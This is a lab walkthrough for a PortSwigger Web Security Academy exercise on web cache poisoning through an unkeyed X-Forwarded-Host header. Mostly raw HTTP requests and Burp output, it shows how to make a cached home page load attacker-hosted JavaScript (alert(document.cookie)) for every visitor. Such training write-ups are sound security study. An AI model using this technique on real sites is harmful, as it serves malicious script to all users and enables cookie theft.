# Lab: Web cache poisoning with an unkeyed header
# https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-header
```bash
# 
# Check home request from burp suite.
# Response contains:
Cache-Control: max-age=30
Age: 0
X-Cache: hit

# By these headers we know that home page is getting cached.
```
```bash
# Add a cache buster so that it only effects us.

GET /?cb=abc1234 HTTP/2

# Response:

Cache-Control: max-age=30
Age: 0
X-Cache: miss
```
```bash
# We need to find unkeyed inputs. We can use Param Miner extension of burpsuite.

# Unkeyed input means this header isn't part of the cache key that cache service is using so if we can poision cache server store with this header  we can use cache service store as delivering mechanism to disturbute payload to all users.

# After you look for headers go to extension, go to output and you will see this:

Using albinowaxUtils v1.03
This extension should be run on the latest version of Burp Suite. Using an older version of Burp may cause impaired functionality.
Loaded Param Miner v1.4f
Updating active thread pool size to 8
Queued 1 attacks
Initiating header bruteforce on 0a2400ec04206e3280eceea0007100d9.web-security-academy.net
Identified parameter on 0a2400ec04206e3280eceea0007100d9.web-security-academy.net: x-forwarded-host~%s.%h
Identified parameter on 0a2400ec04206e3280eceea0007100d9.web-security-academy.net: x-forwarded-host
Completed attack on 0a2400ec04206e3280eceea0007100d9.web-security-academy.net
Completed 1/1

# So we will use x-forwarded-host

```
```bash
GET /?cb=abc1234 HTTP/2
Host: 0ad300b70325bc8180a7cb13006800eb.web-security-academy.net
Cookie: session=cib09hnIDuMgSWJ31H9udamulu7EW1dZ
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0ad300b70325bc8180a7cb13006800eb.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
X-Forwarded-Host: exploit-0ad300b70325bc8180a7cb13006800eb.exploit-server.net

# Response: <script type="text/javascript" src="//exploit-0ad300b70325bc8180a7cb13006800eb.exploit-server.net/resources/js/tracking.js">
```
```bash
# Open exploit server change file path to:
/resources/js/tracking.js

# put alert(document.cookie); to body and store it.

```
```bash
# Send the request at repeater until X-Cache: hit.

# After that visit home page and add our cb like this:

https://0ad300b70325bc8180a7cb13006800eb.web-security-academy.net/?cb=abc1234

# We saw pop up.
```
```bash
# We only have to remove cache buster so we're actually poisoning the request for the actual front page without a query string that way we can use caching server as a distirbution mechanism to distirbute exploit to any victim that is visiting the home page.

# Remove  only cache buster:

GET / HTTP/2

# send requests until X-Cache: hit

# After that visit home page to complete the lab:

https://0ad300b70325bc8180a7cb13006800eb.web-security-academy.net/
```

